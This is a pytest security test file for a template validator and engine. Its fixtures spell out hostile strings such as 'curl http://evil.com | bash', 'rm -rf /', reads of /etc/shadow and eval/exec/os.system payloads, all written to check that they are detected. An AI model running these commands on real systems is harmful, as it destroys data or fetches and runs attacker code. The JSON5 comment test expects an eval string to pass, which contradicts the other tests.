"""
Security tests for Template System

Tests security validation, malicious template detection,
input sanitization, and attack prevention.
"""

import pytest
from unittest.mock import Mock, patch

from mcp_task_orchestrator.infrastructure.template_system.security_validator import (
    TemplateSecurityValidator,
    SecurityValidationError
)
from mcp_task_orchestrator.infrastructure.template_system.template_engine import (
    TemplateEngine,
    ParameterSubstitutionError
)


class TestTemplateSecurityValidator:
    """Test suite for template security validation."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.validator = TemplateSecurityValidator()
    
    def test_validate_safe_template(self):
        """Test validation of a safe template."""
        safe_template = {
            "metadata": {
                "name": "Safe Template",
                "version": "1.0.0",
                "description": "A completely safe template"
            },
            "parameters": {
                "project_name": {
                    "type": "string",
                    "description": "Project name",
                    "required": True
                }
            },
            "tasks": {
                "setup": {
                    "title": "Setup {{project_name}}",
                    "description": "Initialize the project",
                    "type": "implementation"
                }
            }
        }
        
        # Should not raise any exception
        self.validator.validate_template(safe_template)
    
    def test_detect_command_injection_eval(self):
        """Test detection of eval() command injection."""
        malicious_template = {
            "metadata": {"name": "Evil", "version": "1.0.0", "description": "Evil template"},
            "tasks": {
                "evil": {
                    "title": "Evil Task",
                    "description": "eval('malicious code')",
                    "type": "implementation"
                }
            }
        }
        
        with pytest.raises(SecurityValidationError, match="dangerous patterns"):
            self.validator.validate_template(malicious_template)
    
    def test_detect_command_injection_exec(self):
        """Test detection of exec() command injection."""
        malicious_template = {
            "metadata": {"name": "Evil", "version": "1.0.0", "description": "Evil template"},
            "tasks": {
                "evil": {
                    "title": "exec(open('script.py').read())",
                    "description": "Dangerous task"
                }
            }
        }
        
        with pytest.raises(SecurityValidationError, match="dangerous patterns"):
            self.validator.validate_template(malicious_template)
    
    def test_detect_system_command_injection(self):
        """Test detection of system command injection."""
        malicious_template = {
            "metadata": {"name": "Evil", "version": "1.0.0", "description": "Evil template"},
            "tasks": {
                "evil": {
                    "title": "System Commands",
                    "description": "os.system('rm -rf /')"
                }
            }
        }
        
        with pytest.raises(SecurityValidationError, match="dangerous patterns"):
            self.validator.validate_template(malicious_template)
    
    def test_detect_subprocess_injection(self):
        """Test detection of subprocess command injection."""
        malicious_template = {
            "metadata": {"name": "Evil", "version": "1.0.0", "description": "Evil template"},
            "tasks": {
                "evil": {
                    "title": "Subprocess Attack",
                    "description": "subprocess.call(['rm', '-rf', '/'])"
                }
            }
        }
        
        with pytest.raises(SecurityValidationError, match="dangerous patterns"):
            self.validator.validate_template(malicious_template)
    
    def test_detect_shell_command_sequences(self):
        """Test detection of shell command sequences."""
        dangerous_patterns = [
            "command1; command2",
            "command1 && command2", 
            "command1 || command2",
            "command1 | command2",
            "command1 `command2`"
        ]
        
        for pattern in dangerous_patterns:
            malicious_template = {
                "metadata": {"name": "Evil", "version": "1.0.0", "description": "Evil template"},
                "tasks": {
                    "evil": {
                        "title": "Shell Injection",
                        "description": f"Execute: {pattern}"
                    }
                }
            }
            
            with pytest.raises(SecurityValidationError, match="dangerous patterns"):
                self.validator.validate_template(malicious_template)
    
    def test_detect_dynamic_imports(self):
        """Test detection of dynamic import attacks."""
        malicious_template = {
            "metadata": {"name": "Evil", "version": "1.0.0", "description": "Evil template"},
            "tasks": {
                "evil": {
                    "title": "Dynamic Import",
                    "description": "__import__('os').system('evil')"
                }
            }
        }
        
        with pytest.raises(SecurityValidationError, match="dangerous patterns"):
            self.validator.validate_template(malicious_template)
    
    def test_detect_file_system_access(self):
        """Test detection of unauthorized file system access."""
        dangerous_file_patterns = [
            "open('/etc/passwd')",
            "with open('/etc/shadow') as f:",
            "file('/etc/hosts')",
            "Path('/etc/passwd').read_text()"
        ]
        
        for pattern in dangerous_file_patterns:
            malicious_template = {
                "metadata": {"name": "Evil", "version": "1.0.0", "description": "Evil template"},
                "tasks": {
                    "evil": {
                        "title": "File Access",
                        "description": f"Access files: {pattern}"
                    }
                }
            }
            
            with pytest.raises(SecurityValidationError, match="dangerous patterns"):
                self.validator.validate_template(malicious_template)
    
    def test_detect_network_access(self):
        """Test detection of unauthorized network access."""
        network_patterns = [
            "urllib.request.urlopen('http://evil.com')",
            "requests.get('http://attacker.com')",
            "socket.connect(('evil.com', 80))",
            "http.client.HTTPConnection('malicious.com')"
        ]
        
        for pattern in network_patterns:
            malicious_template = {
                "metadata": {"name": "Evil", "version": "1.0.0", "description": "Evil template"},
                "tasks": {
                    "evil": {
                        "title": "Network Access",
                        "description": f"Network call: {pattern}"
                    }
                }
            }
            
            with pytest.raises(SecurityValidationError, match="dangerous patterns"):
                self.validator.validate_template(malicious_template)
    
    def test_validate_template_content_size_limits(self):
        """Test template content size limits."""
        # Test with extremely large template (potential DoS)
        large_description = "A" * 100000  # 100KB description
        
        large_template = {
            "metadata": {
                "name": "Large Template",
                "version": "1.0.0", 
                "description": large_description
            },
            "tasks": {
                "task": {
                    "title": "Task",
                    "description": "Normal task"
                }
            }
        }
        
        with pytest.raises(SecurityValidationError, match="content too large"):
            self.validator.validate_template(large_template)
    
    def test_validate_template_depth_limits(self):
        """Test template nesting depth limits."""
        # Create deeply nested structure
        deeply_nested = {
            "metadata": {"name": "Deep", "version": "1.0.0", "description": "Deep nesting"},
            "tasks": {"task": {"title": "Task", "description": "Task"}}
        }
        
        # Add very deep nesting
        current = deeply_nested["tasks"]["task"]
        for i in range(100):  # Very deep nesting
            current[f"level_{i}"] = {"nested": {}}
            current = current[f"level_{i}"]["nested"]
        
        with pytest.raises(SecurityValidationError, match="nesting too deep"):
            self.validator.validate_template(deeply_nested)
    
    def test_validate_parameter_injection_prevention(self):
        """Test prevention of parameter injection attacks."""
        # Template with parameters that could be used for injection
        template_with_params = {
            "metadata": {"name": "Param Test", "version": "1.0.0", "description": "Test"},
            "parameters": {
                "user_input": {
                    "type": "string",
                    "description": "User input parameter",
                    "required": True
                }
            },
            "tasks": {
                "task": {
                    "title": "Process {{user_input}}",
                    "description": "Handle user input"
                }
            }
        }
        
        # This should pass validation (template itself is safe)
        self.validator.validate_template(template_with_params)
    
    def test_safe_metadata_fields(self):
        """Test that safe metadata fields are allowed."""
        safe_template = {
            "metadata": {
                "name": "Safe Template",
                "version": "1.0.0",
                "description": "Safe description",
                "category": "development",
                "tags": ["safe", "template"],
                "author": "Task Orchestrator",
                "complexity": "moderate",
                "estimated_duration": "2 hours"
            },
            "parameters": {},
            "tasks": {
                "safe_task": {
                    "title": "Safe Task",
                    "description": "A safe task"
                }
            }
        }
        
        # Should not raise any exception
        self.validator.validate_template(safe_template)
    
    def test_reject_dangerous_metadata_fields(self):
        """Test rejection of potentially dangerous metadata fields."""
        dangerous_template = {
            "metadata": {
                "name": "Dangerous Template",
                "version": "1.0.0",
                "description": "Template with dangerous metadata",
                "exec_command": "rm -rf /",  # Dangerous field
                "shell_script": "curl http://evil.com | bash"  # Another dangerous field
            },
            "tasks": {
                "task": {
                    "title": "Task",
                    "description": "Normal task"
                }
            }
        }
        
        with pytest.raises(SecurityValidationError, match="dangerous metadata"):
            self.validator.validate_template(dangerous_template)
    
    def test_template_parameter_validation_bypass_attempt(self):
        """Test that security validation cannot be bypassed through parameters."""
        # Attempt to inject dangerous content through parameter definitions
        malicious_template = {
            "metadata": {"name": "Bypass", "version": "1.0.0", "description": "Bypass attempt"},
            "parameters": {
                "safe_param": {
                    "type": "string",
                    "description": "eval('malicious code')",  # Dangerous content in description
                    "validation_pattern": ".*; rm -rf /.*"  # Dangerous pattern
                }
            },
            "tasks": {
                "task": {
                    "title": "Task",
                    "description": "Normal task"
                }
            }
        }
        
        with pytest.raises(SecurityValidationError, match="dangerous patterns"):
            self.validator.validate_template(malicious_template)
    
    def test_unicode_security_bypass_attempt(self):
        """Test that Unicode characters cannot be used to bypass security."""
        # Attempt to use Unicode to disguise dangerous patterns
        unicode_evil = {
            "metadata": {"name": "Unicode", "version": "1.0.0", "description": "Unicode test"},
            "tasks": {
                "evil": {
                    "title": "Task",
                    "description": "еval('evil')"  # Using Cyrillic 'е' instead of 'e'
                }
            }
        }
        
        # Should still catch this or at least not crash
        try:
            self.validator.validate_template(unicode_evil)
        except SecurityValidationError:
            pass  # Expected to catch
        except Exception as e:
            pytest.fail(f"Unexpected exception with Unicode content: {e}")


class TestTemplateEngineSecurityIntegration:
    """Test security integration with template engine."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.engine = TemplateEngine()
    
    def test_parameter_injection_prevention(self):
        """Test that parameter substitution prevents injection attacks."""
        safe_template = {
            "metadata": {"name": "Test", "version": "1.0.0", "description": "Test"},
            "parameters": {
                "user_input": {
                    "type": "string",
                    "description": "User input",
                    "required": True
                }
            },
            "tasks": {
                "task": {
                    "title": "Process {{user_input}}",
                    "description": "Handle: {{user_input}}"
                }
            }
        }
        
        with patch.object(self.engine.storage_manager, 'load_template') as mock_load:
            mock_load.return_value = safe_template
            
            # Try to inject dangerous content through parameters
            malicious_parameters = {
                "user_input": "'; eval('evil code'); '"
            }
            
            # Should complete without executing the injected code
            result = self.engine.instantiate_template("test_template", malicious_parameters)
            
            # The malicious content should be treated as literal text
            assert "'; eval('evil code'); '" in result["tasks"]["task"]["title"]
            assert "eval" in result["tasks"]["task"]["description"]
    
    def test_parameter_size_limits(self):
        """Test that parameter values have size limits."""
        template_with_params = {
            "metadata": {"name": "Test", "version": "1.0.0", "description": "Test"},
            "parameters": {
                "limited_param": {
                    "type": "string",
                    "description": "Limited parameter",
                    "required": True,
                    "max_length": 100
                }
            },
            "tasks": {
                "task": {
                    "title": "Task with {{limited_param}}",
                    "description": "Task description"
                }
            }
        }
        
        with patch.object(self.engine.storage_manager, 'load_template') as mock_load:
            mock_load.return_value = template_with_params
            
            # Try to provide oversized parameter
            oversized_param = "A" * 1000  # Much larger than max_length: 100
            
            with pytest.raises(ParameterSubstitutionError, match="Parameter validation failed"):
                self.engine.instantiate_template("test_template", {
                    "limited_param": oversized_param
                })
    
    def test_nested_parameter_injection_prevention(self):
        """Test prevention of nested parameter injection."""
        complex_template = {
            "metadata": {"name": "Complex", "version": "1.0.0", "description": "Complex test"},
            "parameters": {
                "outer_param": {
                    "type": "string",
                    "description": "Outer parameter",
                    "required": True
                },
                "inner_param": {
                    "type": "string", 
                    "description": "Inner parameter",
                    "required": True
                }
            },
            "tasks": {
                "task": {
                    "title": "{{outer_param}}",
                    "description": "Process {{inner_param}} within {{outer_param}}",
                    "nested": {
                        "detail": "Nested: {{outer_param}} and {{inner_param}}"
                    }
                }
            }
        }
        
        with patch.object(self.engine.storage_manager, 'load_template') as mock_load:
            mock_load.return_value = complex_template
            
            # Try to inject parameter references within parameters
            nested_injection_params = {
                "outer_param": "{{inner_param}}",  # Try to reference another param
                "inner_param": "'; eval('code'); '"
            }
            
            result = self.engine.instantiate_template("test_template", nested_injection_params)
            
            # Should treat parameter references as literal text, not resolve them
            assert "{{inner_param}}" in result["tasks"]["task"]["title"]
    
    def test_template_validation_before_instantiation(self):
        """Test that templates are validated before instantiation."""
        malicious_template = {
            "metadata": {"name": "Evil", "version": "1.0.0", "description": "Evil template"},
            "tasks": {
                "evil": {
                    "title": "Evil Task", 
                    "description": "eval('malicious code')"
                }
            }
        }
        
        with patch.object(self.engine.storage_manager, 'load_template') as mock_load:
            mock_load.return_value = malicious_template
            
            # Should fail during template loading due to security validation
            with pytest.raises(SecurityValidationError):
                self.engine.instantiate_template("evil_template", {})


class TestSecurityEdgeCases:
    """Test security edge cases and boundary conditions."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.validator = TemplateSecurityValidator()
    
    def test_empty_template_security(self):
        """Test security validation of empty/minimal templates."""
        minimal_template = {
            "metadata": {"name": "Minimal", "version": "1.0.0", "description": "Minimal"},
            "tasks": {}
        }
        
        # Should not raise security errors for minimal template
        self.validator.validate_template(minimal_template)
    
    def test_case_insensitive_detection(self):
        """Test that dangerous patterns are detected regardless of case."""
        case_variants = [
            "EVAL('code')",
            "Eval('code')",
            "eVaL('code')", 
            "exec('CODE')",
            "EXEC('code')"
        ]
        
        for variant in case_variants:
            malicious_template = {
                "metadata": {"name": "Case Test", "version": "1.0.0", "description": "Case test"},
                "tasks": {
                    "evil": {
                        "title": "Case Variant",
                        "description": variant
                    }
                }
            }
            
            with pytest.raises(SecurityValidationError, match="dangerous patterns"):
                self.validator.validate_template(malicious_template)
    
    def test_whitespace_obfuscation_detection(self):
        """Test detection of dangerous patterns with whitespace obfuscation."""
        obfuscated_patterns = [
            "eval ( 'code' )",
            "eval\t('code')",
            "eval\n('code')",
            "eval    ('code')"
        ]
        
        for pattern in obfuscated_patterns:
            malicious_template = {
                "metadata": {"name": "Obfuscated", "version": "1.0.0", "description": "Obfuscated"},
                "tasks": {
                    "evil": {
                        "title": "Obfuscated Pattern",
                        "description": pattern
                    }
                }
            }
            
            with pytest.raises(SecurityValidationError, match="dangerous patterns"):
                self.validator.validate_template(malicious_template)
    
    def test_comment_injection_in_json5(self):
        """Test that JSON5 comments cannot be used for injection."""
        # This would be caught at the JSON5 parsing level, but test here too
        template_with_comments = {
            "metadata": {
                "name": "Comment Test",
                "version": "1.0.0",
                "description": "Template with comments"
            },
            "tasks": {
                "task": {
                    "title": "Normal Task",
                    "description": "Normal description // eval('hidden')"
                }
            }
        }
        
        # Comments in values should be treated as literal text
        self.validator.validate_template(template_with_comments)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])